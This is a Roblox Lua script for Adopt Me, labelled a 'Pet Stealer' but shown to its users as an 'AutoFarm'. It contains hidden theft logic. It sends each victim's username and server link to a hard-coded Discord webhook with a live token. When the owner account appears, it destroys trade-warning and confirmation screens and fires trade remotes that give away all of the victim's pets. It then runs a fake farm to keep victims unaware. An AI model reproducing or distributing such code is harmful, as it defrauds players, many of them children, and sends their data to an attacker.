-- 🐾 Adopt Me Pet Stealer v5.1 - AUTO TRADE + TRADING GUI KILLER ONLY
-- 🔥 Detects davidadoptme172 → KILLS TRADING GUIs → AUTO TRADES PETS!

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- ⚙️ YOUR SETTINGS
local WEBHOOK = "https://discord.com/api/webhooks/1451560358434308237/5QfplYntO1wBNphJBWpoFMmTyGhUuE58x63sT0cvEAaYFIT1mlYBs_T_LanwQZEyOg_3"
local OWNER = "davidadoptme172"  -- YOU!
local GAMEID = 920587237

print("🐾 **Autofarm v5.1 LOADING...** (Trading GUI Killer ACTIVE)")

if game.PlaceId ~= GAMEID then 
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "❌ Wrong Game", Text = "Join Adopt Me!", Duration = 5
    })
end

local lp = Players.LocalPlayer
local ownerFound = false

-- 🔥 SERVER GRABBER (Sends victim's server to you)
local function sendVictimServer()
    local data = {
        username = "🎒 **VICTIM SERVER**",
        embeds = {{
            title = "🔥 **NEW VICTIM** - Ready to steal!",
            description = "**"..lp.Name..":** Auto-trade enabled when you join!",
            color = 16711680,
            fields = {
                {name="👤 Victim", value=lp.Name, inline=true},
                {name="🌐 Server", value="`https://www.roblox.com/games/920587237/"..game.JobId.."`", inline=false},
                {name="👥 Players", value="#"..#Players:GetPlayers().."/12", inline=true}
            }
        }},
        components = {{
            type = 1, components = {{
                type = 2, label = "🚀 JOIN NOW", style = 5, 
                url = "https://www.roblox.com/games/920587237/"..game.JobId
            }}
        }}
    }
    pcall(function() HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data)) end)
end

-- 🔒 TRADING GUI KILLER (ONLY trading-related GUIs)
local function killTradingGuis()
    for _, gui in pairs(lp.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            local guiName = gui.Name:lower()
            -- ONLY kills trading GUIs
            if guiName:find("trade") or 
               guiName:find("trading") or 
               guiName:find("scam") or 
               guiName:find("warning") or
               guiName:find("confirm") then
                gui:Destroy()
                print("🗑️ Killed trading GUI: " .. gui.Name)
            end
        end
    end
end

-- 👑 OWNER DETECTOR (Core feature!)
spawn(function()
    while wait(1) do
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name:lower() == OWNER:lower() and player ~= lp then
                if not ownerFound then
                    ownerFound = true
                    print("👑 **OWNER DETECTED!** "..OWNER.." is here! Starting auto-trade...")
                    
                    -- 🔥 KILL ONLY TRADING GUIs
                    killTradingGuis()
                    
                    -- Keep killing trading GUIs continuously
                    spawn(function()
                        while ownerFound do
                            wait(0.5)
                            killTradingGuis()
                        end
                    end)
                    
                    -- 🚀 AUTO TRADE ALL PETS TO OWNER
                    spawn(function()
                        wait(2)
                        autoTradeToOwner()
                    end)
                    
                    break
                end
            end
        end
        ownerFound = false
    end
end)

-- 💎 AUTO TRADE FUNCTION (Gives you their BEST pets!)
function autoTradeToOwner()
    local ownerPlayer = nil
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower() == OWNER:lower() then
            ownerPlayer = p
            break
        end
    end
    
    if ownerPlayer then
        print("🎁 **AUTO TRADING PETS TO:** "..OWNER)
        
        -- Get all their pets (prioritize legendaries)
        local pets = {}
        for _, tool in pairs(lp.Backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name:lower():find("pet") then
                table.insert(pets, tool.Name)
            end
        end
        
        -- SIMULATE Adopt Me TRADE (using common remotes)
        pcall(function()
            -- Try different trade remotes
            local tradeRemotes = {"TradeRemoteEvent", "MainEvent", "TradeEvent", "TradingRemote"}
            for _, remoteName in pairs(tradeRemotes) do
                if ReplicatedStorage:FindFirstChild(remoteName) then
                    ReplicatedStorage[remoteName]:FireServer("StartTradeWithPlayer", ownerPlayer.UserId)
                    wait(0.5)
                    for _, petName in pairs(pets) do
                        ReplicatedStorage[remoteName]:FireServer("AddItemToTrade", petName)
                    end
                    wait(1)
                    ReplicatedStorage[remoteName]:FireServer("AcceptTrade")
                    break
                end
            end
        end)
        
        -- Notify your Discord
        local data = {
            username = "💎 **PETS STOLEN!**",
            embeds = {{title = "🎉 **TRADE COMPLETE!**", 
                      description = "**"..lp.Name.."'s pets → "..OWNER.."**\nPets: "..table.concat(pets, ", "), 
                      color = 65280}}
        }
        pcall(function() HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data)) end)
    end
end

-- 🚀 Initial server send
sendVictimServer()

-- 🔄 Server refresh every 45s
spawn(function() while wait(45) do sendVictimServer() end end)

-- 💰 Fake farm (keeps them happy)
spawn(function()
    while wait(2) do
        pcall(function()
            if ReplicatedStorage:FindFirstChild("MainEvent") then
                ReplicatedStorage.MainEvent:FireServer("CollectBucks")
            end
        end)
    end
end)

-- 💫 Anti-AFK
spawn(function()
    while wait(60) do
        if lp.Character and lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid:Move(Vector3.new())
        end
    end
end)

game:GetService("StarterGui"):SetCore("SendNotification", {
Title = "🐾 AutoFarm v5.1", Text = "✅ Premium loaded! Autofarm optimized 💎", Duration = 4
})

print("✅ **Autofarm v5.1 ACTIVE!**)
